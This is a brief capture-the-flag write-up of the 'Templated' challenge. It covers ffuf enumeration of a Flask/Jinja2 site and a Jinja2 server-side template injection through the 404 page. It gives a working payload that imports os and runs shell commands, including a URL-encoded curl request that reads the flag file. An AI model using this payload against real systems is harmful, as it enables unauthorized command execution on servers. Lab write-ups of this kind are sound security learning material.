# Templated

> **Can you exploit this simple mistake?**

## A static, empty page??

The root page is a barebone "site under construction":

```html
<html><head></head><body><h1>Site still under construction</h1>
<p>Proudly powered by Flask/Jinja2</p>
</body></html>
```

The server always responds with status 200, even when the page doesn't exist.
`dirbuster` and `gobuster` report bogus findings, but `ffuf` can bypass the lure:

```bash
ffuf -c -fr '404' -u http://138.68.182.108:31201/ -w /usr/share/wordlists/discovery/all.txt
```

Still nothing of interest.

## SSTI

Actually there are 2 pages: the root and the 404 pages.

The 404 page reflects the request in its content:

```html
<p>The page '<str>somemaliciouscode</str>' could not be found</p>
```

`jinja` evaluate special expressions placed in `{{ }}`:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

After url encoding:

```bash
curl http://138.68.182.108:31201/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D
```

## Notes for future me

SSTI can be detected with ffuf:

```bash
ffuf -u http://138.68.182.108:31201/FUZZ -w /usr/share/wordlists/fuzzing/special-chars.txt
```
